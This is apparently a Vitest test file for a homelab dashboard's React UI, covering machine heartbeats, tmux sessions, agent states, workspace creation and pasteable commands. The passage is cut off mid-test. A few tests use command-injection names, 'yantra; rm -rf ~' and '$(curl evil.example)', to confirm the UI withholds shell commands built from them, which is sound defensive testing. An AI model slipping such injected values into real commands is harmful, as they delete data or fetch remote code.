import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  cleanup,
  fireEvent,
  render,
  renderHook,
  screen,
  waitFor,
} from '@testing-library/react'
import type {
  AgentState,
  Beat,
  Looked,
  Machine,
  MachineSessions,
  Session,
  Workspace,
  WorkspaceStatus,
} from './api'
import {
  agentAct,
  type AgentRow,
  agentColumns,
  agentCommand,
  agentState,
  attachable,
  machineColumns,
  sessionColumns,
  sessionCommand,
  type SessionRow,
  workspaceColumns,
} from './columns'
import { Command } from './components/Command'
import { DataTable } from './components/DataTable'
import { Section } from './components/Section'
import { useLooked } from './useLooked'
import App from './App'

afterEach(() => {
  cleanup()
  vi.unstubAllGlobals()
})

/** jsdom implements no `matchMedia` at all, so a width has to be supplied — and
 *  this one answers the query the component really asks rather than a fixed
 *  boolean, so the breakpoint stays the component's to choose. */
function viewport(width: number) {
  vi.stubGlobal('matchMedia', (query: string) => ({
    matches: width < Number(/([\d.]+)rem/.exec(query)?.[1]) * 16,
    addEventListener: () => {},
    removeEventListener: () => {},
  }))
}

beforeEach(() => viewport(1280))

function machine(overrides: Partial<Machine> = {}): Machine {
  return {
    name: 'cachyos-g14',
    dns_name: 'cachyos-g14.<tailnet>.ts.net.',
    os: 'linux',
    online: true,
    expired: false,
    last_seen: '2026-07-07T09:00:00Z',
    heartbeat: beat(),
    ...overrides,
  }
}

function beat(overrides: Partial<Beat> = {}): Beat {
  return {
    age_seconds: 3,
    arch: 'x86_64',
    labels: ['gpu', 'cuda', 'docker'],
    free_ram_mb: 19942,
    free_disk_mb: 214003,
    cpu_busy_pct: 15,
    power: 'ac',
    ...overrides,
  }
}

// A number stands for a status code the daemon answers instead of a body, which
// only `/api/workspaces/:name/status` does.
function stubFetch(answers: Record<string, Looked<unknown> | number>) {
  vi.stubGlobal(
    'fetch',
    vi.fn((path: string) => {
      const answer = answers[path]
      return typeof answer === 'number'
        ? Promise.resolve({ ok: false, status: answer })
        : Promise.resolve({
            ok: true,
            status: 200,
            json: () => Promise.resolve(answer),
          })
    }),
  )
}

describe('the looked envelope', () => {
  it('says nobody has looked rather than drawing an empty fleet', () => {
    render(
      <Section title="Machines" query={{ looked: 'never' }}>
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.getByText('Not looked at yet.')).toBeTruthy()
    expect(screen.queryByText('a table')).toBeNull()
  })

  it('renders a failure as the error and never as a table', () => {
    render(
      <Section
        title="Workspaces"
        query={{ looked: 'failed', age_seconds: 3, error: 'tailscaled is down' }}
      >
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.getByText('tailscaled is down')).toBeTruthy()
    expect(screen.queryByText('a table')).toBeNull()
  })

  it('keeps the newlines in a multi-line parse error', () => {
    const error =
      'invalid workspace file\nTOML parse error at line 3, column 9\n  |\n3 | machine =\n  |         ^\n'
    render(
      <Section title="Workspaces" query={{ looked: 'failed', age_seconds: 1, error }}>
        {() => <p>a table</p>}
      </Section>,
    )
    const rendered = screen.getByText(error, { trim: false, collapseWhitespace: false })
    expect(rendered.textContent).toBe(error)
  })
})

describe('the machines table', () => {
  it('leaves LAST SEEN blank while a machine is online', () => {
    const { container } = render(
      <DataTable
        columns={machineColumns}
        rows={[machine()]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells).toEqual(['cachyos-g14', 'linux', 'online', 'readybeat 3s ago', ''])
  })

  it('composes the status sentence and does not fold an expired key into offline', () => {
    render(
      <DataTable
        columns={machineColumns}
        rows={[machine({ online: false, expired: true, last_seen: '4d ago' })]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
    expect(screen.getByText('offline, key expired')).toBeTruthy()
    expect(screen.getByText('4d ago')).toBeTruthy()
  })
})

/** ADR-0013 §7. The two tests that matter are the dishonest readings: a machine
 *  nothing has ever been heard from must not read as *asleep*, and one Tailscale
 *  still sees must not read as *ready* on the strength of that alone (R-23). */
describe('the four heartbeat states', () => {
  function draw(one: Machine) {
    return render(
      <DataTable
        columns={machineColumns}
        rows={[one]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
  }

  it('says never heard from, and never asleep, for a machine that has not beaten', () => {
    draw(machine({ online: false, heartbeat: null }))

    expect(screen.getByText('never heard from')).toBeTruthy()
    expect(screen.queryByText('asleep or off')).toBeNull()
    // Not a zeroed reading either: there is no age to show, so none is shown.
    expect(screen.queryByText(/beat .* ago/)).toBeNull()
  })

  it('says up, but not reporting — and never ready — when only Tailscale sees it', () => {
    draw(machine({ online: true, heartbeat: beat({ age_seconds: 92 }) }))

    expect(screen.getByText('up, but not reporting')).toBeTruthy()
    expect(screen.queryByText('ready')).toBeNull()
    expect(screen.getByText('beat 92s ago')).toBeTruthy()
  })

  it('says asleep or off when the beats stopped and Tailscale lost it too', () => {
    draw(machine({ online: false, heartbeat: beat({ age_seconds: 92 }) }))

    expect(screen.getByText('asleep or off')).toBeTruthy()
    expect(screen.queryByText('never heard from')).toBeNull()
  })

  it('is ready inside the threshold and reports what the beat carried', () => {
    const { container } = draw(
      machine({
        heartbeat: beat({ age_seconds: 30, power: { battery: { percent: 42 } } }),
      }),
    )

    expect(screen.getByText('ready')).toBeTruthy()
    expect(screen.getByText('beat 30s ago')).toBeTruthy()
    expect(container.querySelector('[title*="battery, 42%"]')).toBeTruthy()
  })
})

describe('the workspaces table', () => {
  it('renders a null startup as a blank cell, not the word none', () => {
    const workspace: Workspace = {
      name: 'yantra',
      machine: 'cachyos-g14',
      repo: '/home/<user>/Github/homelab/yantra',
      startup: null,
    }
    const { container } = render(
      <DataTable
        columns={workspaceColumns({ looked: 'never' }, { looked: 'never' }, () => {}, () => {})}
        rows={[workspace]}
        rowKey={(row) => row.name}
        empty="no workspaces yet"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells[4]).toBe('')
  })

  it('names the path a file goes in when the look succeeded and found nothing', () => {
    render(
      <DataTable
        columns={workspaceColumns({ looked: 'never' }, { looked: 'never' }, () => {}, () => {})}
        rows={[]}
        rowKey={(row) => row.name}
        empty="no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml"
      />,
    )
    expect(
      screen.getByText(
        'no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml',
      ),
    ).toBeTruthy()
  })
})

/** Y-121. The buttons were 15 px past the right edge of a 390 px phone, in a
 *  749 px table inside 295 px of card. Below the breakpoint there is no table,
 *  so there is nothing to swipe sideways and nothing to fall off the end of. */
describe('a workspace row on a phone', () => {
  const site: Workspace = {
    name: 'personal-website',
    machine: 'bishwajeets-macbook-pro',
    repo: '/Users/<user>/Github/personal-website',
    startup: null,
  }

  function draw() {
    return render(
      <DataTable
        columns={workspaceColumns({ looked: 'never' }, { looked: 'never' }, () => {}, () => {})}
        rows={[site]}
        rowKey={(row) => row.name}
        empty="no workspaces yet"
      />,
    )
  }

  it('puts the three verbs on the page instead of inside a table that scrolls', () => {
    viewport(390)
    const { container } = draw()

    for (const name of ['Start claude', 'Stop', 'Resume']) {
      expect(screen.getByRole('button', { name })).toBeTruthy()
    }
    expect(container.querySelector('table')).toBeNull()
    expect(container.querySelector('[data-slot="table-container"]')).toBeNull()
  })

  it('drops no column — every fact the row carried is still labelled', () => {
    viewport(390)
    const { container } = draw()

    const labels = [...container.querySelectorAll('dt')].map(
      (one) => one.textContent,
    )
    expect(labels).toEqual([
      'WORKSPACE',
      'MACHINE',
      'ACT',
      'REPO',
      'STARTUP',
      'TERMINAL',
      'EDIT',
    ])
    expect(screen.getByText('/Users/<user>/Github/personal-website')).toBeTruthy()
  })

  it('keeps the table where there is room for one', () => {
    viewport(1024)
    const { container } = draw()

    expect(container.querySelector('table')).toBeTruthy()
  })
})

describe('the sessions section', () => {
  const session: Session = {
    name: 'yantra',
    windows: 2,
    // A client count: 0 is detached, and rendering it as "no" would be a lie.
    attached: 0,
    created: 'Thu Jul 30 13:02:31 2026',
  }
  const answers: MachineSessions[] = [
    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
    { machine: 'pi', reached: 'no', error: 'connection timed out' },
  ]

  it('renders an unanswered machine as unreachable and not as zero sessions', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'never' },
      '/api/sessions': { looked: 'ok', age_seconds: 6, data: answers },
    })
    render(<App />)

    expect(await screen.findByText('pi unreachable: connection timed out')).toBeTruthy()
    expect(screen.getByText('1 session on 1 of 2 machines')).toBeTruthy()
    expect(screen.queryByText('pi')).toBeNull()
  })

  it('reads its own age against the machine it is waiting for', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'never' },
      '/api/sessions': { looked: 'ok', age_seconds: 44, data: answers },
    })
    render(<App />)

    expect(await screen.findByText('waiting on pi')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('renders attached as the client count rather than a yes or no', () => {
    const { container } = render(
      <DataTable
        columns={sessionColumns({ looked: 'never' })}
        rows={[{ machine: 'cachyos-g14', session }]}
        rowKey={(row) => row.machine}
        empty="no tmux sessions"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells).toEqual([
      'cachyos-g14',
      'yantra',
      '2',
      '0',
      'Thu Jul 30 13:02:31 2026',
      '',
    ])
  })
})

describe('useLooked', () => {
  it('maps a rejected fetch into a failed look rather than throwing', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.reject(new Error('daemon is not running'))),
    )
    const { result } = renderHook(() => useLooked('/api/machines'))

    await waitFor(() => expect(result.current.looked).toBe('failed'))
    expect(result.current).toMatchObject({
      looked: 'failed',
      error: expect.stringContaining('daemon is not running'),
    })
  })

  it('maps a non-200 into a failed look, since the fleet answers 200 either way', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.resolve({ ok: false, status: 404 })),
    )
    const { result } = renderHook(() => useLooked('/api/machines'))

    await waitFor(() => expect(result.current.looked).toBe('failed'))
    expect(result.current).toMatchObject({ error: expect.stringContaining('404') })
  })

  it('answers never before the first response', () => {
    stubFetch({ '/api/machines': { looked: 'ok', age_seconds: 0, data: [] } })
    const { result } = renderHook(() => useLooked('/api/machines'))
    expect(result.current).toEqual({ looked: 'never' })
  })
})

describe('the age reading', () => {
  const aged = (age_seconds: number, waiting?: string[]) =>
    render(
      <Section
        title="Machines"
        query={{ looked: 'ok', age_seconds, data: [] }}
        waiting={waiting}
      >
        {() => <p>a table</p>}
      </Section>,
    )

  it('says how old a fresh reading is and claims nothing else', () => {
    aged(6)
    expect(screen.getByText('looked 6s ago')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  // 30 s of sleep plus the one ConnectTimeout a concurrent sweep can pay.
  it('reads a sweep that waited out an unreachable machine as normal', () => {
    aged(40)
    expect(screen.getByText('looked 40s ago')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('says the refresh did not finish rather than that the data is old', () => {
    aged(73)
    expect(screen.getByText('looked 73s ago')).toBeTruthy()
    expect(screen.getByText('refresh stuck')).toBeTruthy()
  })

  it('names the machine the sweep is waiting for rather than blaming the refresh', () => {
    aged(41, ['cachyos-g14'])
    expect(screen.getByText('waiting on cachyos-g14')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('has nothing left to blame when every machine answered', () => {
    aged(41)
    expect(screen.getByText('refresh stuck')).toBeTruthy()
    expect(screen.queryByText(/waiting on/)).toBeNull()
  })

  // 30 + ServerAliveInterval=15 × ServerAliveCountMax=3, which is the longest
  // ssh itself will wait before giving up on a host that froze after connecting.
  it('stops excusing an age no ssh timeout is long enough to explain', () => {
    aged(76, ['cachyos-g14'])
    expect(screen.getByText('refresh stuck')).toBeTruthy()
  })

  it('does not call a daemon that has never looked stale', () => {
    render(
      <Section title="Machines" query={{ looked: 'never' }}>
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.queryByText(/looked \d+s ago/)).toBeNull()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })
})

describe('the command a row carries', () => {
  function ok<T>(data: T): Looked<T> {
    return { looked: 'ok', age_seconds: 2, data }
  }

  const yantra: Workspace = {
    name: 'yantra',
    machine: 'cachyos-g14',
    repo: '/home/<user>/Github/homelab/yantra',
    startup: null,
  }
  const session: Session = {
    name: 'yantra',
    windows: 1,
    attached: 0,
    created: 'Thu Jul 30 13:02:31 2026',
  }
  const row: SessionRow = { machine: 'cachyos-g14', session }
  const running = ok<MachineSessions[]>([
    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
  ])

  it('offers a terminal only when the session was really seen', () => {
    expect(attachable(yantra, running)).toBe(true)

    const idle = ok<MachineSessions[]>([
      { machine: 'cachyos-g14', reached: 'yes', sessions: [] },
    ])
    expect(attachable(yantra, idle)).toBe(false)
  })

  // Y-113 made `up` a button; Y-130 made the last paste in this row one too.
  it('offers nothing where a look failed, and nothing where nothing is open', () => {
    const failed: Looked<MachineSessions[]> = {
      looked: 'failed',
      age_seconds: 1,
      error: 'tailscaled is down',
    }
    expect(attachable(yantra, failed)).toBe(false)
    expect(attachable(yantra, { looked: 'never' })).toBe(false)
  })

  it('does not read an unreachable machine as a machine with a session', () => {
    const unreachable = ok<MachineSessions[]>([
      { machine: 'cachyos-g14', reached: 'no', error: 'connection timed out' },
    ])
    expect(attachable(yantra, unreachable)).toBe(false)
  })

  it('still refuses a name the daemon would not have allowed a command for', () => {
    const hostile = { ...yantra, name: 'yantra; rm -rf ~' }
    expect(sessionCommand({ machine: 'cachyos-g14', session: { ...session, name: hostile.name } }, ok([hostile]))).toBeNull()
    expect(agentCommand({ workspace: hostile, status: null })).toBeNull()
  })

  it('builds a session row command from the workspace name, never from tmux', () => {
    expect(sessionCommand(row, ok([yantra]))).toBe('yantra attach yantra')

    const hostile: SessionRow = {
      machine: 'cachyos-g14',
      session: { ...session, name: '$(curl evil.example)' },
    }
    expect(sessionCommand(hostile, ok([yantra]))).toBeNull()
  })

  it('does not match a workspace of the same name on another machine', () => {
    const elsewhere: SessionRow = { ...row, machine: 'bishwajeets-macbook-pro' }
    expect(sessionCommand(elsewhere, ok([yantra]))).toBeNull()
    expect(sessionCommand(row, { looked: 'never' })).toBeNull()
  })

  it('puts the terminal in the row, naming the workspace it would open', () => {
    const opened: string[] = []
    render(
      <DataTable
        columns={workspaceColumns(
          running,
          { looked: 'never' },
          (name) => opened.push(name),
          () => {},
        )}
        rows={[yantra]}
        rowKey={(one) => one.name}
        empty="no workspaces yet"
      />,
    )
    fireEvent.click(screen.getByText('Open terminal'))
    expect(opened).toEqual(['yantra'])
    expect(machineColumns.some((column) => column.header === 'COMMAND')).toBe(false)
  })
})

describe('copying a command', () => {
  afterEach(() => {
    Reflect.deleteProperty(navigator, 'clipboard')
  })

  it('selects the command and says so on the origin the daemon actually serves', async () => {
    // jsdom offers neither navigator.clipboard nor execCommand, which is what a
    // plain-HTTP 100.64.0.0/10 address looks like: not a secure context.
    render(<Command command="yantra up yantra" />)
    fireEvent.click(screen.getByRole('button'))

    expect(await screen.findByText('selected — copy it yourself')).toBeTruthy()
    expect(window.getSelection()?.toString()).toBe('yantra up yantra')
  })

  it('writes the command itself when a secure context grants a clipboard', async () => {
    const writeText = vi.fn(() => Promise.resolve())
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText },
      configurable: true,
    })

    render(<Command command="yantra attach yantra" />)
    fireEvent.click(screen.getByRole('button'))

    expect(await screen.findByText('copied')).toBeTruthy()
    expect(writeText).toHaveBeenCalledWith('yantra attach yantra')
  })
})

describe('the agents section', () => {
  const yantra: Workspace = {
    name: 'yantra',
    machine: 'cachyos-g14',
    repo: '/home/<user>/Github/homelab/yantra',
    startup: null,
  }

  function reported(state: AgentState, workspace = yantra): AgentRow {
    return {
      workspace,
      status: {
        workspace: workspace.name,
        machine: workspace.machine,
        reached: 'yes',
        status: state,
        session: null,
      },
    }
  }

  const unreachable: AgentRow = {
    workspace: yantra,
    status: {
      workspace: 'yantra',
      machine: 'cachyos-g14',
      reached: 'no',
      error: 'ssh: connect to host cachyos-g14 port 22: Connection refused',
    },
  }

  function agents(rows: AgentRow[]) {
    render(
      <DataTable
        columns={agentColumns}
        rows={rows}
        rowKey={(row) => row.workspace.name}
        empty="no workspaces yet"
      />,
    )
  }

  function stubPost(status: number, body: unknown) {
    const posted = vi.fn()
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        posted(
          path,
          init?.body === undefined ? undefined : JSON.parse(String(init.body)),
        )
        return Promise.resolve({
          ok: status < 400,
          status,
          json: () => Promise.resolve(body),
          text: () => Promise.resolve(String(body)),
        })
      }),
    )
    return posted
  }

  it('reads a shell session as ordinary and a contradiction as wrong', () => {
    const shell = agentState(reported({ state: 'no_agent' }).status)
    expect(shell.tone).not.toBe('bad')
    expect(shell.label).toContain('shell')

    const ghost = agentState(
      reported({ state: 'unclear', because: 'the pane is alive' }).status,
    )
    expect(ghost.tone).toBe('bad')
  })

  it('renders what told an ending apart rather than flattening it to a label', () => {
    const rows: AgentRow[] = [
      reported({ state: 'crashed', exit_status: 3 }),
      reported(
        { state: 'killed', signal: 'term' },
        { ...yantra, name: 'shot' },
      ),
      reported(
        {
          state: 'unclear',
          because: 'the pane is alive but claude knows of no agent',
        },
        { ...yantra, name: 'ghost' },
      ),
    ]
    render(
      <DataTable
        columns={agentColumns}
        rows={rows}
        rowKey={(row) => row.workspace.name}
        empty="no workspaces yet"
      />,
    )

    expect(screen.getByText('crashed — exit 3')).toBeTruthy()
    // I-48: the same tmux prints a signal as `15` on Linux and `term` on macOS,
    // so it is passed through rather than named.
    expect(screen.getByText('killed — term')).toBeTruthy()
    expect(
      screen.getByText('the pane is alive but claude knows of no agent'),
    ).toBeTruthy()
  })

  it('names the machine that did not answer instead of reporting no agent', () => {
    render(
      <DataTable
        columns={agentColumns}
        rows={[unreachable]}
        rowKey={(row) => row.workspace.name}
        empty="no workspaces yet"
      />,
    )

    expect(screen.getByText('machine did not answer')).toBeTruthy()
    expect(screen.getByText(/Connection refused/)).toBeTruthy()
    expect(screen.queryByText(/yantra (resume|attach|up)/)).toBeNull()
  })

  it('picks the verb the state is for, and attach where there is no route', () => {
    expect(agentAct(reported({ state: 'no_session' }))).toBe('up')
    for (const state of ['finished', 'stopped'] as const) {
      expect(agentAct(reported({ state }))).toBe('resume')
    }
    expect(agentAct(reported({ state: 'crashed', exit_status: 1 }))).toBe(
      'resume',
    )
    expect(agentAct(reported({ state: 'killed', signal: 'KILL' }))).toBe(
      'resume',
    )

    for (const state of [
      'running',
      'awaiting_trust',
      'no_agent',
      'unclear',
    ] as const) {
      const row = reported(
        state === 'unclear' ? { state, because: 'why' } : { state },
      )
      expect(agentAct(row)).toBe('attach')
      expect(agentCommand(row)).toBe('yantra attach yantra')
    }

    // The two with a route behind them are no longer anything to paste.
    expect(agentCommand(reported({ state: 'no_session' }))).toBeNull()
    expect(agentCommand(reported({ state: 'finished' }))).toBeNull()
  })

  it('does not offer resume to a workspace resume refuses on sight', () => {
    const editor = { ...yantra, startup: 'nvim' }
    expect(
      agentAct(reported({ state: 'crashed', exit_status: 1 }, editor)),
    ).toBeNull()
    expect(agentAct(unreachable)).toBeNull()
  })

  // Y-130's rule, now that this cell has both kinds: `USABLE_NAME` guards the
  // string someone pastes into a shell, and never the name a button puts into
  // a URL the browser encodes — that one is the daemon's own 400 to refuse.
  it('withholds the paste from a name a shell would mangle, and not the button', () => {
    const hostile = { ...yantra, name: 'yantra; rm -rf ~' }
    expect(agentCommand(reported({ state: 'running' }, hostile))).toBeNull()

    const posted = stubPost(400, 'invalid workspace name')
    agents([reported({ state: 'no_session' }, hostile)])
    fireEvent.click(screen.getByRole('button', { name: 'Start claude' }))

    expect(posted).toHaveBeenCalledWith(
      '/api/workspaces/yantra%3B%20rm%20-rf%20~/up',
      { agent: 'claude' },
    )
  })

  // M5's own sentence, in the one section that still failed it: a phone has no
  // terminal to paste `yantra up` into.
  it('starts an agent from the page instead of handing over a command', async () => {
    const posted = stubPost(200, {
      machine: 'cachyos-g14',
      session: 'created',
      launched: true,
      term: 'xterm-256color',
    })
    agents([reported({ state: 'no_session' })])

    expect(screen.queryByText('yantra up yantra')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: 'Start claude' }))

    expect(await screen.findByText('Started on cachyos-g14.')).toBeTruthy()
    // ADR-0007 names the agent only where the workspace starts nothing of its
    // own, and the machine is never in the body — it is the workspace's (Y-117).
    expect(posted).toHaveBeenCalledWith('/api/workspaces/yantra/up', {
      agent: 'claude',
    })
  })

  it('resumes each of the four endings, and posts resume rather than up', async () => {
    const posted = stubPost(200, {
      machine: 'cachyos-g14',
      resumed: true,
      term: 'xterm-256color',
    })
    agents([
      reported({ state: 'finished' }),
      reported({ state: 'stopped' }, { ...yantra, name: 'halted' }),
      reported({ state: 'crashed', exit_status: 3 }, { ...yantra, name: 'dead' }),
      reported({ state: 'killed', signal: 'term' }, { ...yantra, name: 'shot' }),
    ])

    const buttons = screen.getAllByRole('button', { name: 'Resume' })
    expect(buttons.length).toBe(4)
    expect(screen.queryByText(/yantra resume/)).toBeNull()

    fireEvent.click(buttons[0])
    expect(await screen.findByText(/Resumed on cachyos-g14/)).toBeTruthy()
    expect(posted).toHaveBeenCalledWith(
      '/api/workspaces/yantra/resume',
      undefined,
    )
  })

  // The decision this row settled, pinned rather than left to reading: the
  // workspaces table offers all three verbs because it reads no state, and
  // this one reads a state, so it offers the one verb that state is for.
  it('offers one verb and never a stop beside an agent that has stopped', () => {
    agents([
      reported({ state: 'no_session' }),
      reported({ state: 'finished' }, { ...yantra, name: 'ended' }),
    ])

    expect(screen.getByRole('button', { name: 'Start claude' })).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Resume' })).toBeTruthy()
    expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull()
    // And neither verb is offered twice: no resume where nothing has run, no
    // start where a session is waiting to be continued.
    expect(screen.getAllByRole('button', { name: /^(Start|Resume)/ }).length).toBe(2)
  })

  it('leaves attach a command, there being no route to hand a terminal over', () => {
    agents([
      reported({ state: 'running' }),
      reported({ state: 'awaiting_trust' }, { ...yantra, name: 'trusting' }),
      reported({ state: 'no_agent' }, { ...yantra, name: 'shell' }),
      reported({ state: 'unclear', because: 'why' }, { ...yantra, name: 'ghost' }),
    ])

    expect(screen.getAllByText(/^yantra attach /).length).toBe(4)
    expect(
      screen.queryByRole('button', { name: /^(Start|Stop|Resume)/ }),
    ).toBeNull()
  })

  // Y-135 is what makes this button worth having here: the state it refuses
  // over is one this very table renders by name, and it is not a crash.
  it('draws a refusal about state as a refusal, not as a verb that failed', async () => {
    const said =
      'claude on cachyos-g14 is not logged in: run `claude` there and sign in'
    stubPost(409, said)
    agents([reported({ state: 'finished' })])
    fireEvent.click(screen.getByRole('button', { name: 'Resume' }))

    expect(await screen.findByText(/Nothing broke and nothing ran/)).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it('says the trust prompt twice and hands over a command, never a dialog', async () => {
    const waiting: WorkspaceStatus = {
      workspace: 'yantra',
      machine: 'cachyos-g14',
      reached: 'yes',
      status: { state: 'awaiting_trust' },
      session: null,
    }
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'ok', age_seconds: 2, data: [yantra] },
      '/api/sessions': { looked: 'never' },
      '/api/workspaces/yantra/status': {
        looked: 'ok',
        age_seconds: 4,
        data: waiting,
      },
    })
    render(<App />)

    expect(
      await screen.findByText("waiting for you at claude's trust prompt"),
    ).toBeTruthy()
    expect(
      screen.getByText(/is holding at claude's trust prompt on cachyos-g14/),
    ).toBeTruthy()
    expect(screen.getAllByText('yantra attach yantra').length).toBe(2)
  })

  // The two readings are taken on their own clocks, so a workspace added since
  // the last agent look is 404 while its neighbours answer.
  it('reads a 404 as a row the agent look has not seen, not as a failed class', async () => {
    const fresh = { ...yantra, name: 'fresh' }
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': {
        looked: 'ok',
        age_seconds: 2,
        data: [yantra, fresh],
      },
      '/api/sessions': { looked: 'never' },
      '/api/workspaces/yantra/status': {
        looked: 'ok',
        age_seconds: 4,
        data: reported({ state: 'running' }).status,
      },
      '/api/workspaces/fresh/status': 404,
    })
    render(<App />)

    expect(await screen.findByText('no report yet')).toBeTruthy()
    expect(screen.getByText('running')).toBeTruthy()
    expect(screen.queryByText('The look failed.')).toBeNull()
  })

  it('inherits the failure of the look that says which workspaces exist', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': {
        looked: 'failed',
        age_seconds: 1,
        error: 'invalid workspace file',
      },
      '/api/sessions': { looked: 'never' },
    })
    render(<App />)

    expect(
      (await screen.findAllByText('invalid workspace file')).length,
    ).toBe(2)
  })
})

describe('creating a workspace', () => {
  const mac = machine({
    name: 'bishwajeets-macbook-pro',
    os: 'macOS',
    online: false,
    last_seen: '2h ago',
  })
  const made: Workspace = {
    name: 'site',
    machine: 'cachyos-g14',
    repo: '/code/site',
    startup: null,
  }

  // The create answers a status and a *plain-text* body rather than a `Looked`
  // envelope, so the POST is stubbed apart from the polls. It returns what the
  // form actually sent.
  function stubCreate(status: number, body: unknown) {
    const posted = vi.fn()
    const looks: Record<string, Looked<unknown>> = {
      '/api/machines': { looked: 'ok', age_seconds: 2, data: [machine(), mac] },
      '/api/workspaces': { looked: 'ok', age_seconds: 2, data: [] },
      '/api/sessions': { looked: 'never' },
    }
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        if (init?.method === 'POST') {
          posted(JSON.parse(String(init.body)))
          return Promise.resolve({
            status,
            json: () => Promise.resolve(body),
            text: () => Promise.resolve(String(body)),
          })
        }
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(looks[path]),
        })
      }),
    )
    return posted
  }

  async function fill(fields: Record<string, string>) {
    for (const [label, value] of Object.entries(fields)) {
      fireEvent.change(await screen.findByLabelText(label), {
        target: { value },
      })
    }
    fireEvent.click(screen.getByRole('button', { name: 'Create workspace' }))
  }

  it('renders the workspace the 201 carried, not the list it is not in yet', async () => {
    const posted = stubCreate(201, made)
    render(<App />)
    await fill({ Name: 'site', Machine: 'cachyos-g14', Repo: '/code/site' })

    expect(await screen.findByText('Created site on cachyos-g14.')).toBeTruthy()
    expect(screen.getByText('/code/site')).toBeTruthy()
    // The read model is 30 s behind a create, so the list still says there is
    // nothing — which is exactly what confirming by re-reading would draw.
    expect(screen.getByText(/^no workspaces yet/)).toBeTruthy()
    // Three keys and no fourth: §B4 holds because there is nowhere to put one.
    expect(posted).toHaveBeenCalledWith({
      name: 'site',
      machine: 'cachyos-g14',
      repo: '/code/site',
    })
  })

  it('says the name is taken rather than that the create failed', async () => {
    const said =
      'a workspace named site already exists at /home/<user>/.config/yantra/workspaces/site.toml'
    stubCreate(409, said)
    render(<App />)
    await fill({ Name: 'site', Machine: 'cachyos-g14', Repo: '/code/site' })

    expect(await screen.findByText('That name is already a workspace.')).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(screen.queryByText('The daemon did not create it.')).toBeNull()
    expect(screen.queryByText(/^Created /)).toBeNull()
  })

  it("does not read a tailscale that could not answer as the caller's fault", async () => {
    const said =
      'could not establish who is calling: whois failed: failed to connect to local tailscaled'
    stubCreate(503, said)
    render(<App />)
    await fill({ Name: 'site', Machine: 'cachyos-g14', Repo: '/code/site' })

    expect(
      await screen.findByText(/could not ask Tailscale who is calling/),
    ).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(
      screen.queryByText(/unusable|already a workspace|not on a node/),
    ).toBeNull()
  })

  // ADR-0009: Yantra never resolves a machine, so a sleeping Mac is a target
  // like any other and the picker must not withhold it.
  it('offers a machine that is asleep and lets it be chosen', async () => {
    const posted = stubCreate(201, { ...made, machine: mac.name })
    render(<App />)

    const asleep = await screen.findByRole('option', {
      name: 'bishwajeets-macbook-pro — offline',
    })
    expect((asleep as HTMLOptionElement).disabled).toBe(false)

    await fill({ Name: 'site', Machine: mac.name, Repo: '/code/site' })
    expect(await screen.findByText(`Created site on ${mac.name}.`)).toBeTruthy()
    expect(posted).toHaveBeenCalledWith(
      expect.objectContaining({ machine: mac.name }),
    )
  })

  it('has nowhere to type a secret, and says startup carries a reference', async () => {
    stubCreate(201, made)
    render(<App />)
    await screen.findByLabelText('Startup')

    expect(screen.queryByLabelText(/secret/i)).toBeNull()
    expect(
      screen.getByText(/a secret stays a reference the shell resolves/),
    ).toBeTruthy()
  })
})

/** Y-126. The tests that matter are what a `PATCH` form gets wrong: a field
 *  nobody touched must not be sent, an emptied `startup` must be sent as `null`
 *  rather than dropped — absent leaves it alone — and the refusal that stops a
 *  live session being stranded must read as a refusal and not as a crash. */
describe('editing a workspace', () => {
  const site: Workspace = {
    name: 'site',
    machine: 'cachyos-g14',
    repo: '/code/site',
    startup: 'claude',
  }
  const mac = machine({
    name: 'bishwajeets-macbook-pro',
    os: 'macOS',
    online: false,
  })

  // The whole body as it went on the wire, because `{}` and `{"startup":null}`
  // are the same object once JSON.parse has dropped the difference.
  function stubEdit(status: number, body: unknown, workspace = site) {
    const patched = vi.fn()
    const looks: Record<string, Looked<unknown>> = {
      '/api/machines': { looked: 'ok', age_seconds: 2, data: [machine(), mac] },
      '/api/workspaces': { looked: 'ok', age_seconds: 2, data: [workspace] },
